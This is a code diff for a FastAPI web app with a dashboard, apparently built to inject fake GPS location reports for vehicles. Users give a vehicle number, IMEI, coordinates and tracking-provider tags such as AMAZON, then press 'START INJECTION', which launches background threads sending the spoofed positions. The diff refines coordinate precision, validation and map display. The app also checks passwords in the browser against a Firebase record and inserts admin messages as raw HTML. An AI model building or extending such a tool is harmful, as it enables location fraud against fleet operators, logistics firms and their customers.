@@ -6,7 +6,7 @@ import httpx
 
 app = FastAPI()
 
-# --- 🚀 CONFIG & STATE ---
+# --- 🚀 CONFIG ---
 DB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com"
 stop_event = threading.Event()
 stop_event.set()
@@ -15,7 +15,7 @@ lock = threading.Lock()
 
 DEFAULT_TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]
 
-# --- 🏎️ TURBO ENGINE ---
+# --- 🏎️ ENGINE ---
 def handshake_worker(tag, imei, vno, lat, lon):
     global total_sent
     while not stop_event.is_set():
@@ -49,28 +49,30 @@ async def init(v:str, i:str, lt:str, ln:str, t:str, background_tasks: Background
     global total_sent
     if stop_event.is_set():
         v_up, t_up = v.upper().strip(), t.upper().strip()
+        
+        # 🎯 Backend 7-Decimal Fix
+        try:
+            lt_fixed = "{:.7f}".format(float(lt))
+            ln_fixed = "{:.7f}".format(float(ln))
+        except:
+            lt_fixed, ln_fixed = lt, ln
+
         total_sent = 0
         stop_event.clear()
-        
-        # Save to DB
         now_ist = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
-        payload = {"Vehicle_No": v_up, "IMEI_No": i, "Lat": lt, "Lon": ln, "Saved_Tag": t_up, "Status": "Active", "Time": now_ist.strftime('%H:%M:%S')}
+        payload = {"Vehicle_No": v_up, "IMEI_No": i, "Lat": lt_fixed, "Lon": ln_fixed, "Saved_Tag": t_up, "Status": "Active", "Time": now_ist.strftime('%H:%M:%S')}
         background_tasks.add_task(sync_data, v_up, t_up, payload)
         
-        # Injection Logic: Fetch all tags if "ALL"
-        run_tags = []
+        run_tags = list(DEFAULT_TAGS) if t_up == "ALL" else [t_up]
         if t_up == "ALL":
-            run_tags = list(DEFAULT_TAGS)
             try:
                 r = requests.get(f"{DB_URL}/Global_Tags.json")
                 extra = r.json()
                 if extra: run_tags.extend(extra.keys())
             except: pass
-        else:
-            run_tags = [t_up]
 
-        for tag in list(set(run_tags)): # set() prevents duplicate fire
-            threading.Thread(target=handshake_worker, args=(tag,i,v_up,lt,ln), daemon=True).start()
+        for tag in list(set(run_tags)):
+            threading.Thread(target=handshake_worker, args=(tag,i,v_up,lt_fixed,ln_fixed), daemon=True).start()
     return {"ok": True}
 
 async def sync_data(vno, tag, payload):
@@ -98,13 +100,12 @@ async def home():
         .dashboard { display:none; }
         input, select { width:100%; background:#000; border:1px solid #333; color:#0f0; padding:12px; margin-top:10px; outline:none; text-transform:uppercase; font-size:16px; box-sizing: border-box; border-radius:5px; }
         .chk-group { display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 15px; width: 100%; color: #fff; font-size: 14px; }
-        .chk-group input[type="checkbox"] { width: 18px !important; height: 18px !important; margin: 0 !important; cursor: pointer; }
         button { width:100%; padding:14px; margin-top:10px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; font-size:14px; border-radius:5px; }
         .progress-container { width:100%; height:12px; background:#111; margin-top:15px; border-radius:6px; display:none; border:1px solid #0f0; overflow:hidden; }
         #progress-bar { width:0%; height:100%; background: linear-gradient(90deg, #0f0, #004400); box-shadow: 0 0 10px #0f0; }
         .audit-box { display:flex; justify-content:space-between; background:rgba(0,40,0,0.5); border:1px solid #0f0; padding:8px; margin-top:10px; border-radius:5px; font-size:10px; color:#fff; text-align:center; }
         .audit-box b { display:block; color:#0f0; font-size:14px; }
-        .user-wall { background:#001a00; border:1px solid #0f0; padding:10px; margin-top:10px; font-size:13px; display:none; color:#fff; border-radius:5px; width:100%; }
+        .user-wall { background:#001a00; border:1px solid #0f0; padding:10px; margin-top:10px; font-size:13px; display:none; color:red; border-radius:5px; width:100%; }
         #map { width:100%; height:250px; margin-top:15px; border:1px solid #0f0; border-radius:10px; }
         .nav { width:95%; max-width:440px; display:flex; justify-content:space-between; font-size:12px; margin-top:10px; color:#fff; }
     </style></head><body>
@@ -115,9 +116,7 @@ async def home():
         <input type="password" id="m_pass" placeholder="PASSWORD">
         <div class="chk-group"><input type="checkbox" id="rem"> <label for="rem">Remember Me</label></div>
         <button onclick="login()" style="background:#0f0;color:#000;border:none;margin-top:20px;">ACCESS SYSTEM</button>
-        <div style="text-align:center; margin-top:20px;">
-            <a href="https://wa.me/917464010787" style="color:#007bff;text-decoration:none;font-weight:bold;font-size:16px;">[ CONTACT ADMIN ]</a>
-        </div>
+        <div style="text-align:center; margin-top:20px;"><a href="https://wa.me/917464010787" style="color:#007bff;text-decoration:none;font-weight:bold;font-size:16px;">[ CONTACT ADMIN ]</a></div>
     </div>
 
     <div class="nav" id="dashNav" style="display:none;"><span>USER: <b id="u_name" style="color:#0f0"></b></span><span onclick="logout()" style="color:red;cursor:pointer;font-weight:bold;">[ LOGOUT ]</span></div>
@@ -127,15 +126,16 @@ async def home():
         <div class="user-wall" id="u_wall"></div>
         <input type="text" id="v" onblur="smartFetch()" placeholder="VEHICLE NUMBER">
         <input type="text" id="i" placeholder="IMEI">
-        
         <select id="tagSel" onchange="checkManual()">
             <option value="ALL">SEND ALL TAGS (DEFAULT)</option>
             <option value="MANUAL">+ ADD NEW TAG</option>
         </select>
         <input type="text" id="manTag" placeholder="ENTER NEW TAG NAME" style="display:none;">
-
         <div class="chk-group"><input type="checkbox" id="useDef" checked> <label for="useDef">Use Default Location (Profile)</label></div>
-        <div style="display:flex;gap:5px;margin-top:10px;"><input type="text" id="lt" placeholder="LAT"><input type="text" id="ln" placeholder="LON"></div>
+        <div style="display:flex;gap:5px;margin-top:10px;">
+            <input type="text" id="lt" placeholder="LAT" oninput="updateMapManually()">
+            <input type="text" id="ln" placeholder="LON" oninput="updateMapManually()">
+        </div>
         <button onclick="getLocation()">[ GET CURRENT LOCATION ]</button>
         <button onclick="st()" id="startBtn" style="background:#0f0;color:#000;font-size:18px;border:none;">START INJECTION</button>
         <button onclick="sp()" style="color:red;border-color:red;">ABORT</button>
@@ -153,24 +153,28 @@ async def home():
 
         function initMap() { if (map) return; map = L.map('map').setView([20.59, 78.96], 5); L.tileLayer('https://{s}.tile.openstreetmap.fr/hot/{z}/{x}/{y}.png').addTo(map); marker = L.marker([20.59, 78.96]).addTo(map); }
         
+        function updateMapManually() {
+            let lat = parseFloat(document.getElementById('lt').value), lon = parseFloat(document.getElementById('ln').value);
+            if(!isNaN(lat) && !isNaN(lon)) { map.setView([lat, lon], 14); marker.setLatLng([lat, lon]); }
+        }
+
         async function loadGlobalTags() {
-            let res = await fetch(`${DB}/Global_Tags.json`);
-            let data = await res.json() || {};
-            let sel = document.getElementById('tagSel');
-            sel.innerHTML = '<option value="ALL">SEND ALL TAGS (DEFAULT)</option>';
-            DEFAULT_TAGS.forEach(t => { let o = document.createElement('option'); o.value = t; o.innerText = t; sel.appendChild(o); });
-            Object.keys(data).forEach(t => { if(!DEFAULT_TAGS.includes(t)) { let o = document.createElement('option'); o.value = t; o.innerText = t; sel.appendChild(o); } });
-            let man = document.createElement('option'); man.value = "MANUAL"; man.innerText = "+ ADD NEW TAG"; sel.appendChild(man);
+            try {
+                let res = await fetch(`${DB}/Global_Tags.json`), data = await res.json() || {};
+                let sel = document.getElementById('tagSel'), cur = sel.value;
+                sel.innerHTML = '<option value="ALL">SEND ALL TAGS (DEFAULT)</option>';
+                DEFAULT_TAGS.forEach(t => { let o = document.createElement('option'); o.value = t; o.innerText = t; sel.appendChild(o); });
+                Object.keys(data).forEach(t => { if(!DEFAULT_TAGS.includes(t)) { let o = document.createElement('option'); o.value = t; o.innerText = t; sel.appendChild(o); } });
+                let man = document.createElement('option'); man.value = "MANUAL"; man.innerText = "+ ADD NEW TAG"; sel.appendChild(man);
+                if(cur) sel.value = cur;
+            } catch(e) {}
         }
 
         async function login() {
             let n = document.getElementById('m_num').value.trim(), p = document.getElementById('m_pass').value.trim();
             let res = await fetch(`${DB}/users/${n}.json`), data = await res.json();
-            if(data && data.password == p) {
-                curUser = { ...data, mobile: n };
-                if(document.getElementById('rem').checked) localStorage.setItem('nitro_user', JSON.stringify(curUser));
-                showDash();
-            } else alert("WRONG PASSWORD");
+            if(data && data.password == p) { curUser = { ...data, mobile: n }; if(document.getElementById('rem').checked) localStorage.setItem('nitro_user', JSON.stringify(curUser)); showDash(); }
+            else alert("WRONG PASSWORD");
         }
 
         window.onload = () => { let s = localStorage.getItem('nitro_user'); if(s){ curUser = JSON.parse(s); showDash(); } }
@@ -180,7 +184,7 @@ async def home():
             document.getElementById('dashNav').style.display='flex'; document.getElementById('u_name').innerText=curUser.mobile;
             initMap(); loadGlobalTags();
             fetch(`${DB}/user_messages/${curUser.mobile}.json`).then(r=>r.json()).then(m=>{
-                if(m&&m.text){ let w=document.getElementById('u_wall'); w.innerHTML=`● <b>ADMIN UPDATE:</b><br><span style="color:red;font-weight:bold;">${m.text}</span>`; w.style.display='block'; }
+                if(m&&m.text){ let w=document.getElementById('u_wall'); w.innerHTML=`● <b>ADMIN UPDATE:</b><br><span>${m.text}</span>`; w.style.display='block'; }
             });
         }
 
@@ -188,29 +192,46 @@ async def home():
 
         async function smartFetch() {
             let v = document.getElementById('v').value.toUpperCase().trim();
-            let res = await fetch(`/fetch_data?vno=${v}`);
-            let d = await res.json();
+            if(!v) return;
+            let res = await fetch(`/fetch_data?vno=${v}`), d = await res.json();
             if(d.IMEI_No){
                 document.getElementById('i').value = d.IMEI_No;
-                document.getElementById('lt').value = document.getElementById('useDef').checked ? curUser.lat : d.Lat;
-                document.getElementById('ln').value = document.getElementById('useDef').checked ? curUser.Lon : d.Lon;
-                if(d.Saved_Tag) {
-                    let sel = document.getElementById('tagSel');
-                    let exists = Array.from(sel.options).some(opt => opt.value == d.Saved_Tag);
-                    if(!exists) await loadGlobalTags();
-                    sel.value = d.Saved_Tag;
-                }
-                map.setView([document.getElementById('lt').value, document.getElementById('ln').value], 14);
-                marker.setLatLng([document.getElementById('lt').value, document.getElementById('ln').value]);
+                let lat = document.getElementById('useDef').checked ? curUser.lat : (d.Lat || d.lat);
+                let lon = document.getElementById('useDef').checked ? curUser.Lon : (d.lon || d.Lon);
+                document.getElementById('lt').value = parseFloat(lat).toFixed(7);
+                document.getElementById('ln').value = parseFloat(lon).toFixed(7);
+                if(d.Saved_Tag) { let sel = document.getElementById('tagSel'); if(!Array.from(sel.options).some(o => o.value == d.Saved_Tag)) await loadGlobalTags(); sel.value = d.Saved_Tag; }
+                updateMapManually();
             }
         }
 
+        function getLocation() {
+            navigator.geolocation.getCurrentPosition(p=>{
+                document.getElementById('lt').value = p.coords.latitude.toFixed(7);
+                document.getElementById('ln').value = p.coords.longitude.toFixed(7);
+                updateMapManually();
+            }, null, {enableHighAccuracy:true});
+        }
+
         function st() {
+            // 🛑 VALIDATION LOGIC
+            let v=document.getElementById('v').value.trim(), 
+                i=document.getElementById('i').value.trim(), 
+                lt=document.getElementById('lt').value.trim(), 
+                ln=document.getElementById('ln').value.trim(), 
+                tag = document.getElementById('tagSel').value;
+
+            if(!v || !i || !lt || !ln) {
+                alert("ALL BOXES (Vehicle, IMEI, Lat, Lon) MUST BE FILLED!");
+                return;
+            }
+
+            if(tag == "MANUAL") {
+                tag = document.getElementById('manTag').value.toUpperCase().trim();
+                if(!tag) { alert("PLEASE ENTER TAG NAME!"); return; }
+            }
+            
             if(mon) clearInterval(mon);
-            let v=document.getElementById('v').value, i=document.getElementById('i').value, lt=document.getElementById('lt').value, ln=document.getElementById('ln').value;
-            let tag = document.getElementById('tagSel').value;
-            if(tag == "MANUAL") tag = document.getElementById('manTag').value.toUpperCase().trim();
-            if(!tag) return alert("ENTER TAG");
             fetch(`/init?v=${v}&i=${i}&lt=${lt}&ln=${ln}&t=${tag}`);
             document.getElementById('st_text').innerText="FIRING"; document.getElementById('p-cont').style.display="block";
             mon = setInterval(()=>{ fetch('/status').then(r=>r.json()).then(d=>{ document.getElementById('c').innerText=d.c; document.getElementById('progress-bar').style.width = (d.c % 100) + "%"; }); }, 1000);
@@ -219,6 +240,5 @@ async def home():
         async function sp() { fetch('/stop'); if(mon) clearInterval(mon); mon = null; document.getElementById('st_text').innerText="IDLE"; document.getElementById('p-cont').style.display="none"; }
         function resetInputs() { location.reload(); }
         function logout() { localStorage.removeItem('nitro_user'); location.reload(); }
-        function getLocation() { navigator.geolocation.getCurrentPosition(p=>{ document.getElementById('lt').value=p.coords.latitude.toFixed(6); document.getElementById('ln').value=p.coords.longitude.toFixed(6); }); }
     </script></body></html>
     """
